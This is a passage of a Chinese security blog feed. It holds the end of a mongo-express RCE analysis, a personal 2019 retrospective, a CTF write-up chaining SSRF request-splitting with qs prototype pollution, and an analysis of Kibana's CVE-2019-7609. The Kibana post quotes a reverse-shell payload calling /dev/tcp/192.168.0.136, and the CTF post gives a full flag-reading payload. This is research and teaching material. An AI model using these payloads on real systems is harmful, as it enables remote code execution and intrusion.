parts = authorization.split(&#39; &#39;);    if (parts.length !== 2) return next(error(400));    var scheme = parts[0]      , credentials = new Buffer(parts[1], &#39;base64&#39;).toString()      , index = credentials.indexOf(&#39;:&#39;);    if (&#39;Basic&#39; != scheme || index &lt; 0) return next(error(400));    var user = credentials.slice(0, index)      , pass = credentials.slice(index + 1);    // async    if (callback.length &gt;= 3) {      callback(user, pass, function(err, user){        if (err || !user)  return unauthorized(res, realm);        req.user = req.remoteUser = user;        next();      });    // sync    } else {      if (callback(user, pass)) {        req.user = req.remoteUser = user;        next();      } else {        unauthorized(res, realm);      }    }  }};</code></pre><p>在这之后的所有请求则必须都要有<code>req.headers.authorization</code>，来与全局变量<code>username</code>&amp;<code>password</code>比对进行认证，否则返回Unauthorized。</p><p>所以要想不进入<code>basicAuth</code>函数，只需要<code>config.useBasicAuth = false</code></p><h2 id="cli启动-未授权"><a href="#cli启动-未授权" class="headerlink" title="cli启动-未授权"></a>cli启动-未授权</h2><p>在mongo-express中还有一种启动方式，即用命令行传递参数。<br><img src="http://static.zybuluo.com/1160307775/ju6aewyf8sm5po3yu3r18urz/image_1dto26qrj1bge18bm6o41o13bn667.png" alt="image_1dto26qrj1bge18bm6o41o13bn667.png-44.5kB"></p><p>由于poc中，用docker拉的mongodb默认是未授权的形式，所以不需要-u&amp;-p来指定数据库的账号密码。但是实际环境中mongodb不太可能是未授权，所以我觉得以cli+参数启动服务的场景应该算是多见吧。</p><p>那么如果受害者指定了用户名&amp;密码去启动express-mongo，那么攻击者直接未授权就可以打(即不需要指定authoriza header)</p><p>不过在官方文档中给出了一句话:</p><pre><code>You can use the following environment variables to modify the container&#39;s configuration</code></pre><p>因为config.default.js默认会从环境变量中加载mongodb的用户名&amp;密码，这样无需参数就能启动服务，也顺便避免了未授权的问题</p><h1 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h1><p><a href="https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2" target="_blank" rel="noopener">https://github.com/mongo-express/mongo-express/commit/d8c9bda46a204ecba1d35558452685cd0674e6f2</a></p><p>在0.54.0中将bson.js中的vm依赖删除，改用<code>mongo-query-parser</code></p><p><img src="http://static.zybuluo.com/1160307775/abenhjn0g17fc8ef5jlgjvd2/image_1dtohg4gq10ehc9k100fbfq11ok8u.png" alt="image_1dtohg4gq10ehc9k100fbfq11ok8u.png-32.5kB"></p><h1 id="express分析"><a href="#express分析" class="headerlink" title="express分析"></a>express分析</h1><p>框架流程，使用一堆中间键</p><p>然后启动流程就是对中间键的层级调用，具体看这篇文章:<a href="https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/" target="_blank" rel="noopener">https://shadowwood.me/2016/08/27/2016-08-27-express-origin-code-analysis/</a></p><pre><code>核心的两步:layer.handle_request(req, res, next);/*handle_request定义的就是express应用中的路由中间件请求处理函数，也就是例如app.get(‘/test’, function(req, res, next){})的操作最后的执行位置。*//*layer.handle_request会执行layer.route的dispatch操作，也就是在Route中派发路由最终执行到在express中定义的对应的路由操作函数，之后又执行next()就又到了这里的proto.stack中的下一个遍历操作。*///handle_request原生是这样写的:Layer.prototype.handle_request = function handle(req, res, next) {  var fn = this.handle;  if (fn.length &gt; 3) {    // not a standard request handler    return next();  }  try {    fn(req, res, next);  } catch (err) {    next(err);  }};</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2019-10758-mongo-expressRCE复现分析&quot;&gt;&lt;a href=&quot;#CVE-2019-10758-mongo-expressRCE复现分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2019-10758:mongo-e
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>My 2019</title>
    <link href="https://hpdoger.cn/2020/01/01/My%202019/"/>
    <id>https://hpdoger.cn/2020/01/01/My 2019/</id>
    <published>2019-12-31T16:00:00.000Z</published>
    <updated>2020-01-03T03:19:10.070Z</updated>
    
    <content type="html"><![CDATA[<h1 id="My-2019"><a href="#My-2019" class="headerlink" title="My 2019"></a>My 2019</h1><p>9102年的最后一天，按照国际惯例还是要记录一下。</p><p>从18年底到现在，大大小小的flag立了无数，自己都忘记完成了些什么，又有多少计划搁浅了。2019年最遗憾的是懒狗的本质还是没有改掉。</p><p>记得18年的这个时候我给自己定了个标签叫”蜕变”。因为18年是我大学入门安全的第一年，从一知半解到求知的过程像是破茧成蝶，充满坎坷但是有股奋斗的劲头。</p><p>然而，我想了很久也没能找到合适的词汇来描述19这一年，绞尽脑汁也没想起来今年都做过哪些有意义的事。无论是天南海北的打比赛、还是去学着挖洞，都比不上18年那股热情。好在当初立下的flag还是完成了一些，勉强也算是在技术上有一些进步，那干脆19年就叫”自定义”好了。</p><p>“自定义”了些什么呢？挖洞/审计/CTF？感觉每样都沾边，但是每样又没做到很好。懒狗的毛病又被无限化放大，干啥都是三分钟热度。举个例子来说：当初说要好好挖SRC，结果自动化的工具写了几天就去玩儿了，亦或者被其他琐事缠身(搬砖)，没有持之以恒。有位大师傅说得好，搞安全、挖漏洞，讲求的不光是门路多、思路广，还要学会坐得住、坐得稳。也希望自己来年可以学会如何<strong>专心</strong></p><p>记录一下2019年自己小赚人生第一桶金吧，虽然挣的确实不多，而且也特别累。上半年入手了自己的mbp，下半年猪肉涨价全用来吃饭了。可能是信安这个行业在今年突然变火的原因吧，还是搬了一些小砖，也浪费了不少时间。下半年以后太懒了也就不做这些了，主要原因还是想去多学点东西。通过hw或者一些其他项目对信安这个专业有了一些收入的认知。只要live as a tool man，还是能取得不错的薪资，但这必不可能是我们的归途。我是永远觉得金钱&lt;&lt;热情，希望自己在未来能够有能力说出这句话。</p><p>未来的一年要备战考研，博客大概率会长草，打算趁着寒假还有时间就多发几篇</p><p>20，继续做那个有点理想的普通人。</p><p>最后，祝这个世界依旧热闹，祝我仍是我。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;My-2019&quot;&gt;&lt;a href=&quot;#My-2019&quot; class=&quot;headerlink&quot; title=&quot;My 2019&quot;&gt;&lt;/a&gt;My 2019&lt;/h1&gt;&lt;p&gt;9102年的最后一天，按照国际惯例还是要记录一下。&lt;/p&gt;
&lt;p&gt;从18年底到现在，大大小小的fla
      
    
    </summary>
    
    
      <category term="博客文章" scheme="https://hpdoger.cn/tags/%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title>I-SOON2019-Membershop出题思路</title>
    <link href="https://hpdoger.cn/2019/12/01/I-SOON2019-Membershop%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
    <id>https://hpdoger.cn/2019/12/01/I-SOON2019-Membershop出题思路/</id>
    <published>2019-11-30T16:00:00.000Z</published>
    <updated>2019-12-01T16:07:12.650Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>今年是第二年出题，鉴于去年题目过于简单(去年我是真的sb且敷衍)，今年题目我憋了蛮长时间的(狗日的前端)，本希望做到这题的师傅们能有所收获。但是比赛跟各位师傅的时间还是冲突了，加之校赛的局限，实际也没多少人在打。比赛当天下午，Membershop容器的峰值也就5、6个的样子。其实题目并不是很难。</p><p>虽然最后没能达到自己预期的做题效果，算是有点点失望吧。但是我相信D0g3一定能把比赛办出去，感谢运维小哥@0akarma跟我一起调试动态容器的bug，关于全部的题目环境在:<a href="http://dao.ge/isoon2019" target="_blank" rel="noopener">http://dao.ge/isoon2019</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>题目开源地址:<a href="https://github.com/Hpd0ger/My_ctf_challenge/" target="_blank" rel="noopener">https://github.com/Hpd0ger/My_ctf_challenge/</a></p><p>修改index.js的server_ip为环境的ip</p><pre><code>docker-compose builddocker-compose up -d</code></pre><h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><p>登陆的时候过滤了admin，同时发现小写字符转换成了大写字母显示。结合set-cookie是koa的框架，很容易联想到后端使用<code>toUpperCase()</code>做转换，拉丁文越权登陆<code>admın</code></p><p><img src="http://static.zybuluo.com/1160307775/uevaveqvu1j6y2trkxfhf08u/image_1dr12lu22vs4iq44id1vuas21m.png" alt="image_1dr12lu22vs4iq44id1vuas21m.png-38.1kB"></p><p>登陆成功之后多了一个请求记录的功能，同时登陆成功后给出源码的地址</p><p><img src="http://static.zybuluo.com/1160307775/vmsnv0pzmurxdz2amugpr9br/image_1dr12phlo1hc31vqi17fvahuhgr16.png" alt="image_1dr12phlo1hc31vqi17fvahuhgr16.png-48.1kB"></p><p>拿到源码后简单看登陆逻辑<br><img src="http://static.zybuluo.com/1160307775/w044ik52f2r0v4qy9dztwfc2/image_1dmbk6vlo19d413cc13h8b108q913.png" alt="image_1dmbk6vlo19d413cc13h8b108q913.png-57.7kB"></p><p>逻辑根据传入的用户名<code>userName</code>会在登陆前经过一次检测<br><img src="http://static.zybuluo.com/1160307775/1sn9fw27548pjpjy0yfishg4/image_1dmbk45jltj28kro9c1kjdkshm.png" alt="image_1dmbk45jltj28kro9c1kjdkshm.png-65.8kB"></p><p>当传入的用户名包含<code>admin</code>时，则自动循环replace掉。在登陆成功的同时会把<code>username</code>写进session里，这里可以看到只有我们登陆了<code>admin</code>才有权限加载其他模版<br><img src="http://static.zybuluo.com/1160307775/8rvxorv0r9e3u03r6vjzyo2u/image_1dmbkcg89ijlmd61vef209bti1g.png" alt="image_1dmbkcg89ijlmd61vef209bti1g.png-160.3kB"></p><p>漏洞点在代码76-117行，它只允许请求以<code>http://127.0.0.1:3000/query</code>(后面拉到本地环境会改127.0.0.1这个地址，这是我本地debug)开头的url。输入其他开头的url会被<code>error url</code>，而且不存在任何host的绕过。当请求之后会被记录在sandbox的results.txt里面并且支持追加，sandbox根据ip建立<br><img src="http://static.zybuluo.com/1160307775/1fkgcdl7j1qc7v6dcjf6tdxm/image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png" alt="image_1dmbkrtpt1pkv1q561o9kf2p10hj2n.png-28.9kB"><br><img src="http://static.zybuluo.com/1160307775/sl6ii6qt9zm6mj7jrfhsetsp/image_1dmbku3fk399n211cvq49r1emt34.png" alt="image_1dmbku3fk399n211cvq49r1emt34.png-33.7kB"></p><p>因为query也是一个路由，那么这里就存在一个ssrf。如何bypass去请求其他路由呢？只需要用unicode编码并且分割http包，例如</p><pre><code>http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}</code></pre><p>url编码是16进制，\u{01xx}在http.get的时候不会进行percent encode，但是在buffer写入的时候会把xx解码。其中<code>\u{0173}\u{0161}\u{0176}\u{0165}</code>代表的是<code>save</code>，73617665是<code>save</code>的16进制表示。具体原理可以看:<a href="https://www.4hou.com/vulnerable/13637.html" target="_blank" rel="noopener">通过拆分请求来实现的SSRF攻击</a></p><p>接着就寻找一下其他路由存在的问题，可利用点在<code>/save</code></p><pre><code>home.get(&#39;/save&#39;,async(ctx)=&gt;{    let ip = ctx.request.ip;    let reqbody = {switch:false}    reqbody = qs.parse(ctx.querystring,{allowPrototypes: false});    if (ip.substr(0, 7) == &quot;::ffff:&quot;) {        ip = ip.substr(7);    }    if (ip !== &#39;127.0.0.1&#39; &amp;&amp; ip !== server_ip) {        ctx.status = 403;        ctx.response.body = &#39;403: You are not the local user&#39;;    }else {        if(reqbody.switch === true &amp;&amp; reqbody.sandbox &amp;&amp; reqbody.opath &amp;&amp;fs.existsSync(reqbody.spath)){            if(fs.existsSync(reqbody.sandbox)){                paths.opath = fs.readdirSync(reqbody.sandbox)[0];            }else if(fs.existsSync(reqbody.opath)){                let buffer;                tmp[reqbody.sandbox][&#39;opath&#39;] = reqbody.opath;                if(/[flag]/.test(tmp[reqbody.sandbox][&#39;opath&#39;])){                    buffer = tmp[reqbody.sandbox][&#39;opath&#39;].replace(/f|l|a|g/g,&#39;&#39;);                }else{                    buffer = reqbody.opath;                }            }            let opath = paths.opath? paths.opath : buffer;            let text = fs.readFileSync(opath, &#39;utf8&#39;);            await WriteResults(reqbody.spath,text);        }else{            return false;        }    }})</code></pre><p>这里大致有两个障碍点：</p><p>1、限制了本地127.0.0.1访问<br>-&gt;ssrf解决</p><p>2、通过qs包解析url参数存为对象，switch默认为flase，配置<code>allowPrototypes=false</code>，直接传递http参数不能覆盖switch。qs.parse() bypass for prototype pollution@qs&lt;6.3，参考链接:<a href="https://snyk.io/vuln/npm:qs:20170213" target="_blank" rel="noopener">Prototype Override Protection Bypass</a>，传参:<code>]=switch</code>绕过</p><p>3、解析获得的对象需要三个参数sandbox、opath、spath。代码逻辑就是如果存在sandbox那么就取sandbox下的第一个文件(即results.txt)读取后写入spath，否则读取自定义的opath，将结果写入spath(两者前提都是spath必须存在且可写，只有sandbox/result.txt满足要求)。但是自定义opath会替换所有的[flag]字段，不允许直接读flag。</p><p>这里存在判断的绕过。原型链污染sandbox下的一个文件为/flag，再去自定义读到spath里</p><pre><code>tmp[&#39;__proto__&#39;][&#39;opath&#39;] = &#39;/flag&#39;;=&gt;paths.opath = /flag</code></pre><p>构造一下就能把flag追加写入到sandbox/results.txt。poc如下，调整一下opath为flag地址，sandbox为自己的<code>md5(ip)</code>就行了：</p><pre><code>encodeURI(&quot;http://127.0.0.1:3000/query?param=1\u{0120}HTTP/1.1\u{010D}\u{010A}Host:\u{0120}127.0.0.1:3000\u{010D}\u{010A}Connection:\u{0120}keep-alive\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/\u{0173}\u{0161}\u{0176}\u{0165}?]=switch&amp;sandbox=__proto__&amp;opath=/flag&amp;spath=tmp/ab54a5cf83f67d827ecba68e394f9196&quot;)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;今年是第二年出题，鉴于去年题目过于简单(去年我是真的sb且敷衍)，今年题目我憋了蛮长时间的(狗日的前端)，本希望做到这题的师
      
    
    </summary>
    
    
      <category term="小组/学校" scheme="https://hpdoger.cn/tags/%E5%B0%8F%E7%BB%84-%E5%AD%A6%E6%A0%A1/"/>
    
  </entry>
  
  <entry>
    <title>从Kibana-RCE对nodejs子进程创建的思考</title>
    <link href="https://hpdoger.cn/2019/11/20/%E4%BB%8EKibana-RCE%E5%AF%B9nodejs%E5%AD%90%E8%BF%9B%E7%A8%8B%E5%88%9B%E5%BB%BA%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://hpdoger.cn/2019/11/20/从Kibana-RCE对nodejs子进程创建的思考/</id>
    <published>2019-11-19T16:00:00.000Z</published>
    <updated>2019-11-20T07:56:05.431Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从Kibana-RCE对nodejs子进程创建的思考"><a href="#从Kibana-RCE对nodejs子进程创建的思考" class="headerlink" title="从Kibana-RCE对nodejs子进程创建的思考"></a>从Kibana-RCE对nodejs子进程创建的思考</h1><p>在前几天Kibana有一则关于原型链污染+子进程调用=&gt;rce的漏洞，跟进分析的时候发现child_process实现子进程创建确实存在trick。于是有了下文是对child_process的实现和Kibana RCE的一点思考。</p><h1 id="child-process建立子进程的实现"><a href="#child-process建立子进程的实现" class="headerlink" title="child_process建立子进程的实现"></a>child_process建立子进程的实现</h1><p>对于child_process大家应该都不陌生，它是nodejs内置模块，用于新建子进程，在CTF题目中也常使用<code>require(&#39;child_process&#39;).exec(&#39;xxx&#39;)</code>来RCE。</p><p>child_process内置了6个方法:execFileSync、execSync、fork、exec、execFile、spawn()</p><p>其中execFileSync()调用spawnSync()，execSync()调用spawnSync()，而spawnSync()调用spawn();exec()调用execFile()，而execFile()调用spawn();fork()调用spawn()。也就是说前6个方法最终都是调用spawn()，而spawn()的本质是创建ChildProcess的实例并返回。那我们直接对spawn这个方法进行分析</p><p>测试代码:</p><pre><code>const { spawn } = require(&#39;child_process&#39;);spawn(&#39;whoami&#39;).stdout.on(&#39;data&#39;, (data) =&gt; {    console.log(`stdout: ${data}`);  });</code></pre><p>Node使用模块<code>child_process</code>建立子进程时，调用<code>用户层面的spawn</code>方法。初始化子进程的参数，进入方法<code>normalizeSpawnArguments</code></p><pre><code>var spawn = exports.spawn = function(/*file, args, options*/) {  var opts = normalizeSpawnArguments.apply(null, arguments);};</code></pre><p>跟进方法<code>normalizeSpawnArguments</code>，当options不存在时将options命为空对象。接着到下面最关键的一步，即获取env变量的方式。首先对options.env是否存在做了判断，如果options.env为undefined则将环境变量<code>process.env</code>的值复制给env。而后对envParivs这个数组进行push操作，其实就是env变量对应的键值对。</p><pre><code>function normalizeSpawnArguments(file, args, options) {    ...//省略  if (options === undefined)    options = {};    ...//省略  var env = options.env || process.env;  var envPairs = [];  for (var key in env) {    envPairs.push(key + &#39;=&#39; + env[key]);  }  _convertCustomFds(options);  return {    file: file,    args: args,    options: options,    envPairs: envPairs  };}</code></pre><p><img src="http://static.zybuluo.com/1160307775/70133nyslwwm715le1gimvfi/image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png" alt="image_1dpddlch71nmr1v2g1jgs1guv18nj2a.png-386.4kB"></p><p>这里就存在一个问题，options默认为空对象，那么它的<strong>任何属性</strong>都存在被污染的可能。所以只要能污染到<code>Object.prototype</code>，那么options就可以添加我们想要的任何属性，包括<code>options.env</code>。经过<code>normalizeSpawnArguments</code>封装并返回后，建立新的子进程<code>new ChildProcess()</code>，这里才算进入内部child_process的实现。</p><pre><code>var opts = normalizeSpawnArguments.apply(null, arguments);var options = opts.options;var child = new ChildProcess();child.spawn({file: opts.file,args: opts.args,cwd: options.cwd,windowsVerbatimArguments: !!options.windowsVerbatimArguments,detached: !!options.detached,envPairs: opts.envPairs,stdio: options.stdio,uid: options.uid,gid: options.gid});</code></pre><p>我们直接看<code>ChildProcess.spawn</code>如何实现，也就是原生的spawn。核心代码逻辑是下面的两句，具体代码在<code>process_wrap.cc</code></p><pre><code>ChildProcess.prototype.spawn = function(options) {  //...  var err = this._handle.spawn(options);  //...  // Add .send() method and start listening for IPC data  if (ipc !== undefined) setupChannel(this, ipc);  return err;};</code></pre><p><code>this._handle.spawn</code>调用了<code>process_wrap.cc</code>的spawn来生成子进程，是node子进程创建的底层实现，那我们看一下<code>process_wrap.cc</code>中对options的值进行了怎样的操作，。</p><pre><code>  static void Spawn(const FunctionCallbackInfo&lt;Value&gt;&amp; args) {    //获取js传过来的第一个option参数    Local&lt;Object&gt; js_options = args[0]-&gt;ToObject(env-&gt;context()).ToLocalChecked();    ...    // options.env    Local&lt;Value&gt; env_v =        js_options-&gt;Get(context, env-&gt;env_pairs_string()).ToLocalChecked();    if (!env_v.IsEmpty() &amp;&amp; env_v-&gt;IsArray()) {      Local&lt;Array&gt; env_opt = Local&lt;Array&gt;::Cast(env_v);      int envc = env_opt-&gt;Length();      CHECK_GT(envc + 1, 0);  // Check for overflow.      options.env = new char*[envc + 1];  // Heap allocated to detect errors.      for (int i = 0; i &lt; envc; i++) {        node::Utf8Value pair(env-&gt;isolate(),                             env_opt-&gt;Get(context, i).ToLocalChecked());        options.env[i] = strdup(*pair);        CHECK_NOT_NULL(options.env[i]);      }      options.env[envc] = nullptr;    }    ...    //调用uv_spawn生成子进程，并将父进程的event_loop传递过去    int err = uv_spawn(env-&gt;event_loop(), &amp;wrap-&gt;process_, &amp;options);    //省略  }</code></pre><p>代码只截取了对env这个属性的操作，它将原先的envPairs进行封装。最后所有options带入<code>uv_spawn</code>来生成子进程，在<code>uv_spawn</code>中就是常规的fork()、waitpid()来控制进程的产生和资源释放，不过有一个非常重要的实现如下:</p><pre><code>//process.cc-&gt;uv_spawn()execvp(options-&gt;file, options-&gt;args);</code></pre><p>execvp来执行任务，这里的options-&gt;file就是我们最初传给spawn的参数。比如我们的例子是<code>spawn(&#39;whoami&#39;)</code>，那么此时的file就是<code>whoami</code>，当然对于有参数的命令，则options-&gt;args与之对应。</p><h2 id="总结流程"><a href="#总结流程" class="headerlink" title="总结流程"></a>总结流程</h2><p>child_process创建子进程的流程看起来有些复杂，总结一下:</p><p>1、初始化子进程需要的参数，设置环境变量<br>2、fork()创建子进程，并用<code>execvp</code>执行系统命令。<br>3、ipc通信，输出捕捉</p><h1 id="Kibana-RCE"><a href="#Kibana-RCE" class="headerlink" title="Kibana-RCE"></a>Kibana-RCE</h1><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先引用漏洞原作者的举例<br><img src="http://static.zybuluo.com/1160307775/bhalsijd98obd3c2u5bctmpz/image_1dpfrsth1180fc11uprr5j1r0713.png" alt="image_1dpfrsth1180fc11uprr5j1r0713.png-74.8kB"></p><p>node的官方文档中也能找到相同的用例:<a href="https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。" target="_blank" rel="noopener">https://nodejs.org/api/cli.html#cli_node_options_options，node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include。</a><br><img src="http://static.zybuluo.com/1160307775/dtx12zmomo7zm16h5mu9mvd8/image_1dpfrn6951t43bqt2prj21l9im.png" alt="image_1dpfrn6951t43bqt2prj21l9im.png-142.2kB"></p><p>在node进程启动的时候作为环境变量加载，通过打印process.env也能证明</p><pre><code>hpdoger@ChocoMacBook-Pro$ NODE_OPTIONS=&#39;--require ./evil.js&#39; nodesuccess!!!&gt; process.env.NODE_OPTIONS&#39;--require ./evil.js&#39;</code></pre><p>如果我们能改变本地环境变量，则在node创建进程的时候就可以包含恶意语句。尝试用export来实现如下。<br><img src="http://static.zybuluo.com/1160307775/39a5x7o5hdzs8ql0pbo3cbho/image_1dpfsa9vei1kk2g1f5a1qchv531g.png" alt="image_1dpfsa9vei1kk2g1f5a1qchv531g.png-27.1kB"></p><p>事实证明，只要产生新进程就会加载一次本地环境变量，存储形式为process.env，若env中存在NODE_OPTIONS则进行相应的加载。但是这种需要bash漏洞就是耍流氓，于是作者想到了一种方法来污染process.env，也就是上文分析的env的获取，于是有了Kibana的poc</p><pre><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></pre><p>node运行时会把当前进程的env写进系统的环境变量，子进程也一样，在linux中存储为<code>/proc/self/environ</code>。通过污染env把恶意的语句写进/proc/self/environ。同时污染<code>process.NODE_OPTIONS</code>属性，使node在生成新进程的时候，包含我们构造的<code>/proc/self/environ</code>。具体操作就类似下面的用法<br><img src="http://static.zybuluo.com/1160307775/401us91ytoegl88xvsh0zj3a/image_1dpftrvc7qk59jmbjg17lk1f4b2d.png" alt="image_1dpftrvc7qk59jmbjg17lk1f4b2d.png-23.8kB"></p><p>污染了Object.env之后，利用Canvas生成新进程的时候会执行spawn从而RCE</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>最开始我并没有跟进Kibana的源码，只是把漏洞归结于:</p><pre><code>污染Object.env+创建子进程 =&gt; RCE</code></pre><p>于是我做了下面的测试，发现并没有像我想象中的输出evil.js中的内容，但是NODE_OPTIONS确实被写进了子进程的env。<br><img src="http://static.zybuluo.com/1160307775/pxl3up7lfbbj8966hg0t49cu/image_1dpfugpbejdu1cos1cra12pv11mr4p.png" alt="image_1dpfugpbejdu1cos1cra12pv11mr4p.png-102.2kB"></p><p>当我将进程建立换为<code>proc.fork()</code>时，则成功加载了evil.js并输出<br><img src="http://static.zybuluo.com/1160307775/400rh8hi6z4231wta13ll6l6/image_1dpfuioo51pov0m17et1as61ibf56.png" alt="image_1dpfuioo51pov0m17et1as61ibf56.png-126.9kB"></p><p>child_process.fork() 方法是 child_process.spawn() 的一个特例，专门用于衍生新的 Node.js 进程。 与 child_process.spawn() 一样返回 ChildProcess 对象。所以fork调用的是spawn来实现的子进程创建，那怎么会有这种情况？跟进一下fork看看实现有什么不同</p><pre><code>exports.fork = function(modulePath /*, args, options*/) {    ...//省略    options.execPath = options.execPath || process.execPath;    return spawn(options.execPath, args, options);}</code></pre><p>它处理了execPath这个属性，默认获取系统变量的process.execPath，再传入spawn，这里就是<code>node</code>。<br><img src="http://static.zybuluo.com/1160307775/3som47zksrvzoyeta5xufflt/image_1dpfv09ba1lqiq4eglf17fmdgc63.png" alt="image_1dpfv09ba1lqiq4eglf17fmdgc63.png-62.4kB"></p><p>而我们用spawn时，处理得到的file为<code>whoami</code><br><img src="http://static.zybuluo.com/1160307775/l68vdzmr5twb7bkh9dwtpw1i/image_1dpfvg05d1kth1o5n6adan9b8k6g.png" alt="image_1dpfvg05d1kth1o5n6adan9b8k6g.png-202.9kB"></p><p>上文分析child_process在子进程创建的最底层，会调用execvp执行命令执行file</p><pre><code>execvp(options-&gt;file, options-&gt;args);</code></pre><p>而上面poc核心就是<code>NODE_OPTIONS=&#39;--require /proc/self/environ&#39; node</code>，即bash调用了node去执行。所以此处的file值必须为node，否则无法将NODE_OPTIONS载入。而直接调用spawn函数时必须有file值，这也造成了第一种代码无法加载evil.js的情况<br><img src="http://static.zybuluo.com/1160307775/sj60p3ly3wetghpqf9oitvn5/image_1dpg0ajvt1b051icfapj1eaupi67a.png" alt="image_1dpg0ajvt1b051icfapj1eaupi67a.png-58.5kB"></p><p>经过测试exec、execFile函数无论传入什么命令，file的值都会为<code>/bin/sh</code>，因为参数shell默认为true。即使不传入options选项，这两个命令也会默认定义options，这也是child_process防止命令执行的一种途径。<br><img src="http://static.zybuluo.com/1160307775/5ed7bm1z723crkc08l0279cr/image_1dpg1kbn81deo1e4aeai11jebbn9.png" alt="image_1dpg1kbn81deo1e4aeai11jebbn9.png-26kB"></p><p>但是shell这个变量也是可以被污染的，不过child_process在这里做了限制，即使shell===false或字符串。最终传到execvp时也会被执行的参数替代，而不是真正的node进程。</p><p>这样看来在污染了原型的条件下，child_process只有进行了fork()的时候，才能达到漏洞的利用。不过这样的利用面确实太窄了，如果有师傅研究过其他函数的执行spawn时能启动node进程，可以交流一下思路</p><p>所以回到fork()函数，我们可以验证包含/proc/self/environ是可行的</p><pre><code>// test.jsproc = require(&#39;child_process&#39;);var aa = {}aa.__proto__.env = {&#39;AAAA&#39;:&#39;console.log(123)//&#39;,&#39;NODE_OPTIONS&#39;:&#39;--require /proc/self/environ&#39;}proc.fork(&#39;./function.js&#39;);//function.jsconsole.log(&#39;this is func&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/uzueehmtlujd7zwq0belponu/image_1dpindplj1ocv1q5o1ksf11v510o89.png" alt="image_1dpindplj1ocv1q5o1ksf11v510o89.png-23.3kB"></p><p>同时可以看到，fork在指定了modulepath的情况下，包含environ的同时并不影响modulepath中代码的执行。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><p><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank" rel="noopener">Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609)</a><br><a href="http://cnode1.rssing.com/chan-68517434/all_p385.html" target="_blank" rel="noopener">spawn、exec、execFile和fork</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzA4NzA5OTYzNw==&mid=2247483761&idx=1&sn=a366c51bd57b4fead862d11616a10b19&chksm=903fd0eba74859fd6ba296e29bf600a1004eeed72de3fb433c74d47654ce37a435e6d1e2742c&mpshare=1&scene=1&srcid=&sharer_sharetime=1571588210071&sharer_shareid=3674d5df50965fb924ba35f64042cb57&key=a2eb8c0b2340b20d3581c0a15949a693ac0879f7879b201f3878bc1f796bf6e8225380e8c186fbea7a3f5abb3c67841d7f71500c9619d916c3ced85f20b5d9cefdb3980e259d7e0c59132aada59c4132&ascene=1&uin=MTMyNzEzMTk2NQ%3D%3D&devicetype=Windows+10&version=62070152&lang=zh_CN&pass_ticket=866ICVsXH4EG%2FSMhWF45HLNA4E5jKkn%2Fh4V6bsGMzepRRdEW4YsHhfvV84kkAfIA" target="_blank" rel="noopener">Kibana漏洞之javascript原型链污染</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从Kibana-RCE对nodejs子进程创建的思考&quot;&gt;&lt;a href=&quot;#从Kibana-RCE对nodejs子进程创建的思考&quot; class=&quot;headerlink&quot; title=&quot;从Kibana-RCE对nodejs子进程创建的思考&quot;&gt;&lt;/a&gt;从Kibana-
      
    
    </summary>
    
    
      <category term="前端安全" scheme="https://hpdoger.cn/tags/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>字节跳动CTF线下赛Web题解&amp;复盘</title>
    <link href="https://hpdoger.cn/2019/10/20/%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8CTF%E7%BA%BF%E4%B8%8B%E8%B5%9BWeb%E9%A2%98%E8%A7%A3&amp;%E5%A4%8D%E7%9B%98/"/>
    <id>https://hpdoger.cn/2019/10/20/字节跳动CTF线下赛Web题解&amp;复盘/</id>
